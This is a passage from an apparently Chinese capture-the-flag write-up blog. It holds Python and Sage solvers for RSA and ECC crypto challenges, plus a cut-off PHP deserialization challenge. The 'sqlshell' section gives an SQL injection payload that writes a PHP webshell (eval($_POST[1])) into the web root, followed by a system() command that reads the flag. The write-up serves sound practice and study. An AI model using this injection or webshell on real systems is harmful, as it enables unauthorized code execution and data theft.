class="hljs-number">3668637434348843171145584606519031375027610199908169273169275927238735031431533260375377791001464799116453803408104076615710166171199990283470548282669948353598733020244755959461974603778630346457439345913209321194112256348302765254052193562603687450740346132207444615610078198488883539133291840346099727880587092122957231085658576850601488737629051252914095889313671875244094452330062619943781809984690384476868543570724769198985172300665613239047649089399919032152539462701309393130614829962670866062380816370571057536421400102100259975636785825540933280194583888638501981649650640939392658268133881679239293596283</span><br>N = <span class="hljs-number">9748523098652101859947730585916490335896800943242955095820326993765071194474558998322598145898741779502734772138283011560029368500998354183150180904846368209977332058847768859238711047784703104535311583123388923571789764758869419482184613566672922481672444028753365755071127320541645016370072493604532087980626825687519083734367691341907014061379844209864141989961751681235215504772582878202048494707090104738899927036896915997556102574747166491969027546256022019959716418675672979328622656831990050058120299353807110233202113906317969377201045402271911946244076903611612303290556012512559696538977841061277173754331</span><br>c = <span class="hljs-number">5374936627659221745209010619827617207565185520404653329184605916859755641352457088986635357806048863755173540232471505333583684733535121482637476692432365062808450583470788320547816186936317927449796090525477205337038591439577855884910604383190932340306435201976465543731935147881754136301375206828970248293731391543905441514528959500307972606931927112031018356411970001312995489429650903529877904694901310020882390008248466887950986326522740278880600110217817950511478637493101027659292006016454642135508207492151610829525082829566392116546434101694921106423469015683277992978077101831969525458693031031468092418427</span><br><br><span class="hljs-comment"># Calculate n and m</span><br>n = <span class="hljs-built_in">round</span>((<span class="hljs-number">1</span>-<span class="hljs-number">2</span>*beta-<span class="hljs-number">2</span>*delta)/((<span class="hljs-number">1</span>-beta)**<span class="hljs-number">2</span>-<span class="hljs-number">2</span>*delta-beta), <span class="hljs-number">6</span>)<br>m = (<span class="hljs-number">1</span>-beta) * n<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;m = <span class="hljs-subst">&#123;m&#125;</span>, n = <span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># Round n up to the nearest integer and convert m to an integer</span><br>n = <span class="hljs-built_in">int</span>(n + <span class="hljs-number">1</span>)<br>m = <span class="hljs-built_in">int</span>(m)<br><br><span class="hljs-comment"># Calculate X and Y</span><br>X = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(N, delta))<br>Y = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(N, delta+beta))<br><br><span class="hljs-comment"># Set up the polynomial ring</span><br>Z.&lt;x,y&gt; = ZZ[]<br><br><span class="hljs-comment"># Create the lattice</span><br>L = Matrix(ZZ, n, n)<br>f = e*x - y<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    g = <span class="hljs-built_in">list</span>(N**<span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>,m-i) * x**(n-<span class="hljs-number">1</span>-i) * f**i)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(g)):<br>        L[i,j] = g[j][<span class="hljs-number">0</span>] * X**(n-<span class="hljs-number">1</span>-j) * Y**j<br><br><span class="hljs-comment"># Apply LLL algorithm</span><br>L = L.LLL()[<span class="hljs-number">0</span>]<br><br><span class="hljs-comment"># Reconstruct the polynomial</span><br>coeff = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    coeff.append((L[i]//(X**(n-<span class="hljs-number">1</span>-i)*Y**i), <span class="hljs-string">f&#x27;x**<span class="hljs-subst">&#123;n-<span class="hljs-number">1</span>-i&#125;</span>*y**<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>))<br>s = <span class="hljs-string">&#x27;+&#x27;</span>.join([<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;c[<span class="hljs-number">0</span>]&#125;</span>*<span class="hljs-subst">&#123;c[<span class="hljs-number">1</span>]&#125;</span>&#x27;</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> coeff])<br>f = <span class="hljs-built_in">eval</span>(s)<br><br><span class="hljs-comment"># Factor the polynomial</span><br>factored_f = f.factor()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Factored polynomial:&quot;</span>, factored_f)<br><br><span class="hljs-comment"># Extract the linear factor (if exists)</span><br>linear_factor = <span class="hljs-built_in">next</span>((factor <span class="hljs-keyword">for</span> factor, _ <span class="hljs-keyword">in</span> factored_f <span class="hljs-keyword">if</span> factor.degree() == <span class="hljs-number">1</span>), <span class="hljs-literal">None</span>)<br><br><span class="hljs-keyword">if</span> linear_factor:<br>    <span class="hljs-comment"># Extract k and dp from the linear factor</span><br>    k = <span class="hljs-built_in">abs</span>(linear_factor.coefficients()[<span class="hljs-number">0</span>]) + <span class="hljs-number">1</span><br>    dp = <span class="hljs-built_in">abs</span>(linear_factor.coefficients()[<span class="hljs-number">1</span>])<br>    <br>    <span class="hljs-comment"># Calculate p and q</span><br>    p = (e * dp - <span class="hljs-number">1</span>) // k + <span class="hljs-number">1</span><br>    q = N // p<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Possible p: <span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Possible q: <span class="hljs-subst">&#123;q&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-comment"># Verify if p and q are correct</span><br>    <span class="hljs-keyword">if</span> p * q == N:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Successfully factored N!&quot;</span>)<br>        <br>        <span class="hljs-comment"># Calculate private key d</span><br>        phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>        d = <span class="hljs-built_in">int</span>(gmpy2.invert(e, phi))<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Private key d: <span class="hljs-subst">&#123;d&#125;</span>&quot;</span>)<br>        <br>        <span class="hljs-comment"># Decrypt the message</span><br>        m = <span class="hljs-built_in">pow</span>(c, d, N)<br>        plaintext = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted message:&quot;</span>, plaintext)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to factor N correctly.&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No linear factor found. The attack might have failed.&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="欧拉欧拉"><a class="markdownIt-Anchor" href="#欧拉欧拉"></a> 欧拉欧拉！！</h3><p>发现对n可以直接用factordb分解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>p = <span class="hljs-number">1523365295049608852447528761114036169506740936697335552555682720997896170562682523843468707748630306876516559528314335864164090878934605899152321495370201</span><br>n = <span class="hljs-number">18104347461003907895610914021247683508445228187648940019610703551961828343286923443588324205257353157349226965840638901792059481287140055747874675375786201782262247550663098932351593199099796736521757473187142907551498526346132033381442243277945568526912391580431142769526917165011590824127172120180838162091</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">14859652090105683079145454585893160422247900801288656111826569181159038438427898859238993694117308678150258749913747829849091269373672489350727536945889312021893859587868138786640133976196803958879602927438349289325983895357127086714561807181967380062187404628829595784290171905916316214021661729616120643997</span><br><br>q = n // p<br><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> isPrime(q):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;q 不是素数，检查输入&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;找到 q: <span class="hljs-subst">&#123;q&#125;</span>&quot;</span>)<br>    phi_n = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>    d = inverse(e, phi_n)<br>    m = <span class="hljs-built_in">pow</span>(c, d, n)<br>    flag = long_to_bytes(m)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag =&quot;</span>, flag)<br></code></pre></td></tr></table></figure><h1 id="week5"><a class="markdownIt-Anchor" href="#week5"></a> week5</h1><h2 id="crypto-5"><a class="markdownIt-Anchor" href="#crypto-5"></a> crypto</h2><h3 id="rsacmd5"><a class="markdownIt-Anchor" href="#rsacmd5"></a> RSA？cmd5！</h3><p>得到的MD5值去cmd5的网址可以直接出，然后继续解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-comment"># 给定的密文和签名</span><br>c = <span class="hljs-number">119084320846787611587774426118526847905825678869032529318497425064970463356147909835330423466179802531093233559613714033492951177656433798856482195873924140269461792479008703758436687940228268475598134411304167494814557384094637387369282900460926092035234233538644197114822992825439656673482850515654334379332</span><br>s = <span class="hljs-number">5461514893126669960233658468203682813465911805334274462134892270260355037191167357098405392972668890146716863374229152116784218921275571185229135409696720018765930919309887205786492284716906060670649040459662723215737124829497658722113929054827469554157634284671989682162929417551313954916635460603628116503</span><br>n = <span class="hljs-number">139458221347981983099030378716991183653410063401398496859351212711302933950230621243347114295539950275542983665063430931475751013491128583801570410029527087462464558398730501041018349125941967135719526654701663270142483830687281477000567117071676521061576952568958398421029292366101543468414270793284704549051</span><br>e = <span class="hljs-number">65537</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_MD5</span>(<span class="hljs-params">m0</span>):<br>    md5_object = hashlib.md5(m0.encode())<br>    md5_result = md5_object.hexdigest()<br>    <span class="hljs-keyword">return</span> md5_result<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_s</span>(<span class="hljs-params">m0, d0, n0</span>):<br>    hm0 = get_MD5(m0)<br>    hm1 = bytes_to_long(hm0.encode())<br>    s0 = <span class="hljs-built_in">pow</span>(hm1, d0, n0)<br>    <span class="hljs-keyword">return</span> s0<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rsa_encode</span>(<span class="hljs-params">m0, e0, n0</span>):<br>    m1 = bytes_to_long(m0.encode())<br>    c0 = <span class="hljs-built_in">pow</span>(m1, e0, n0)<br>    <span class="hljs-keyword">return</span> c0<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>(<span class="hljs-params">m0</span>):<br>    flag = <span class="hljs-string">&#x27;flag&#123;th1s_1s_my_k3y:&#x27;</span> + m0 + <span class="hljs-string">&#x27;0x&#x27;</span> + hashlib.sha256(m0.encode()).hexdigest() + <span class="hljs-string">&#x27;&#125;&#x27;</span><br>    <span class="hljs-keyword">return</span> flag<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recover_message_from_signature</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;通过签名恢复MD5值&quot;&quot;&quot;</span><br>    recovered_md5_int = <span class="hljs-built_in">pow</span>(s, e, n)<br>    recovered_md5 = long_to_bytes(recovered_md5_int).decode()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Recovered MD5: <span class="hljs-subst">&#123;recovered_md5&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> recovered_md5<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_message</span>(<span class="hljs-params">message</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;验证消息的正确性&quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 验证MD5</span><br>    calculated_md5 = get_MD5(message)<br>    recovered_md5 = <span class="hljs-string">&quot;86133884de98baada58a8c4de66e15b8&quot;</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nVerification results:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Message: <span class="hljs-subst">&#123;message&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Calculated MD5: <span class="hljs-subst">&#123;calculated_md5&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Expected MD5:   <span class="hljs-subst">&#123;recovered_md5&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;MD5 Match: <span class="hljs-subst">&#123;calculated_md5 == recovered_md5&#125;</span>&quot;</span>)<br><br>    <span class="hljs-comment"># 计算签名验证</span><br>    hm1 = bytes_to_long(calculated_md5.encode())<br>    verify_result = <span class="hljs-built_in">pow</span>(s, e, n)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Signature verification: <span class="hljs-subst">&#123;verify_result == hm1&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> calculated_md5 == recovered_md5<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># Step 1: 从签名中恢复MD5</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Step 1: Recovering MD5 from signature...&quot;</span>)<br>    recovered_md5 = recover_message_from_signature()<br><br>    <span class="hljs-comment"># Step 2: 我们已知消息是 &quot;adm0n12&quot;</span><br>    message = <span class="hljs-string">&quot;adm0n12&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nStep 2: Using known message: <span class="hljs-subst">&#123;message&#125;</span>&quot;</span>)<br><br>    <span class="hljs-comment"># Step 3: 验证消息</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nStep 3: Verifying message...&quot;</span>)<br>    <span class="hljs-keyword">if</span> verify_message(message):<br>        <span class="hljs-comment"># Step 4: 生成flag</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nStep 4: Generating flag...&quot;</span>)<br>        flag = get_flag(message)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nFinal Flag:&quot;</span>)<br>        <span class="hljs-built_in">print</span>(flag)<br><br>        <span class="hljs-comment"># Step 5: 额外验证 - 检查密文</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nStep 5: Additional verification...&quot;</span>)<br>        test_c = rsa_encode(flag, e, n)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Ciphertext match: <span class="hljs-subst">&#123;test_c == c&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Message verification failed!&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="easy_ecc"><a class="markdownIt-Anchor" href="#easy_ecc"></a> easy_ecc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> * <span class="hljs-comment"># type: ignore</span><br><br><span class="hljs-comment"># Given parameters</span><br>p = <span class="hljs-number">64408890408990977312449920805352688472706861581336743385477748208693864804529</span><br>a = <span class="hljs-number">111430905433526442875199303277188510507615671079377406541731212384727808735043</span><br>b = <span class="hljs-number">89198454229925288228295769729512965517404638795380570071386449796440992672131</span><br>k = <span class="hljs-number">86388708736702446338970388622357740462258632504448854088010402300997950626097</span><br><br><span class="hljs-comment"># Given ciphertext points</span><br>c1_x = <span class="hljs-number">10968743933204598092696133780775439201414778610710138014434989682840359444219</span><br>c1_y = <span class="hljs-number">50103014985350991132553587845849427708725164924911977563743169106436852927878</span><br>c2_x = <span class="hljs-number">16867464324078683910705186791465451317548022113044260821414766837123655851895</span><br>c2_y = <span class="hljs-number">35017929439600128416871870160299373917483006878637442291141472473285240957511</span><br><br><span class="hljs-comment"># Given encrypted message parts</span><br>c_left = <span class="hljs-number">15994601655318787407246474983001154806876869424718464381078733967623659362582</span><br>c_right = <span class="hljs-number">3289163848384516328785319206783144958342012136997423465408554351179699716569</span><br><br><span class="hljs-comment"># Initialize the elliptic curve</span><br>E = EllipticCurve(GF(p), [a,b])<br><br><span class="hljs-comment"># Convert points to curve points</span><br>C1 = E(c1_x, c1_y)<br>C2 = E(c2_x, c2_y)<br><br><span class="hljs-comment"># Decrypt the message point</span><br>M = C1 - k*C2<br><br><span class="hljs-comment"># Get the original message coordinates</span><br>m_x = M[<span class="hljs-number">0</span>]<br>m_y = M[<span class="hljs-number">1</span>]<br><br><span class="hljs-comment"># Convert to GF(p) elements</span><br>F = GF(p)<br>m_x = F(m_x)<br>m_y = F(m_y)<br><br><span class="hljs-comment"># Calculate multiplicative inverse</span><br>m_x_inv = <span class="hljs-number">1</span>/m_x<br>m_y_inv = <span class="hljs-number">1</span>/m_y<br><br><span class="hljs-comment"># Recover the flag parts using multiplicative inverse</span><br>flag_left = c_left * m_x_inv<br>flag_right = c_right * m_y_inv<br><br><span class="hljs-comment"># Convert to bytes</span><br>flag_left = long_to_bytes(<span class="hljs-built_in">int</span>(flag_left))<br>flag_right = long_to_bytes(<span class="hljs-built_in">int</span>(flag_right))<br><br><span class="hljs-comment"># Print the result</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Recovered flag:&quot;</span>, flag_left + flag_right)<br></code></pre></td></tr></table></figure><h3 id="没e也能玩"><a class="markdownIt-Anchor" href="#没e也能玩"></a> 没e也能玩</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_rsa_crt</span>(<span class="hljs-params">c, p, q, dp, dq</span>):<br>    <span class="hljs-comment"># Calculate q_inv = q^(-1) mod p</span><br>    q_inv = <span class="hljs-built_in">int</span>(invert(q, p))<br><br>    <span class="hljs-comment"># Calculate message parts using CRT</span><br>    m1 = <span class="hljs-built_in">pow</span>(c, dp, p)<br>    m2 = <span class="hljs-built_in">pow</span>(c, dq, q)<br><br>    <span class="hljs-comment"># Use CRT to combine results</span><br>    h = (q_inv * (m1 - m2)) % p<br>    m = m2 + h * q<br><br>    <span class="hljs-keyword">return</span> m<br><br><br><span class="hljs-comment"># Given values</span><br>c = <span class="hljs-number">312026920216195772014255984174463085443866592575942633449581804171108045852080517840578408476885673600123673447592477875543106559822653280458539889975125069364584140981069913341705738633426978886491359036285144974311751490792757751756044409664421663980721578870582548395096887840688928684149014816557276765747135567714257184475027270111822159712532338590457693333403200971556224662094381891648467959054115723744963414673861964744567056823925630723343002325605154661959863849738333074326769879861280895388423162444746726568892877802824353858845944856881876742211956986853244518521508714633279380808950337611574412909</span><br>p = <span class="hljs-number">108043725609186781791705090463399988837848128384507136697546885182257613493145758848215714322999196482303958182639388180063206708575175264502030010971971799850889123915580518613554382722069874295016841596099030496486069157061211091761273568631799006187376088457421848367280401857536410610375012371577177832001</span><br>q = <span class="hljs-number">121590551121540247114817509966135120751936084528211093275386628666641298457070126234836053337681325952068673362753408092990553364818851439157868686131416391201519794244659155411228907897025948436021990520853498462677797392855335364006924106615008646396883330251028071418465977013680888333091554558623089051503</span><br>dp = <span class="hljs-number">11282958604593959665264348980446305500804623200078838572989469798546944577064705030092746827389207634235443944672230537015008113180165395276742807804632116181385860873677969229460704569172318227491268503039531329141563655811632035522134920788501646372986281785901019732756566066694831838769040155501078857473</span><br>dq = <span class="hljs-number">46575357360806054039250786123714177813397065260787208532360436486982363496441528434309234218672688812437737096579970959403617066243685956461527617935564293219447837324227893212131933165188205281564552085623483305721400518031651417947568896538797580895484369480168587284879837144688420597737619751280559493857</span><br><br><span class="hljs-comment"># Solve and convert result to text</span><br>m = solve_rsa_crt(c, p, q, dp, dq)<br>flag = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decrypted flag: <span class="hljs-subst">&#123;flag.decode()&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="web-5"><a class="markdownIt-Anchor" href="#web-5"></a> web</h2><h3 id="sqlshell复现"><a class="markdownIt-Anchor" href="#sqlshell复现"></a> sqlshell(复现)</h3><p>没想到直接这么写orz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">alice<span class="hljs-string">&#x27; union select 1,&#x27;</span>&lt;?php <span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[1]);?&gt;<span class="hljs-string">&#x27;,3 INTO OUTFILE &#x27;</span>/var/www/html/orange.php<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1=system(<span class="hljs-string">&#x27;cat /you_cannot_read_the_flag_directly&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="臭皮吹泡泡复现"><a class="markdownIt-Anchor" href="#臭皮吹泡泡复现"></a> 臭皮吹泡泡(复现)</h3><p>好长的pop链当时有其他比赛自己也没细看，跟着学学吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">study</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$study</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;study == <span class="hljs-string">&quot;happy&quot;</span>) &#123;<br>            <span class="hljs-keyword">echo</span> (<span class="hljs-variable language_">$this</span>-&gt;study);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctf</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctf</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;ctf === <span class="hljs-string">&quot;phpinfo&quot;</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;u can&#x27;t do this!!!!!!!&quot;</span>);<br>        &#125;<br>        (<span class="hljs-variable language_">$this</span>-&gt;ctf)(<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;can can need&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">let_me</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$let_me</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$time</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span 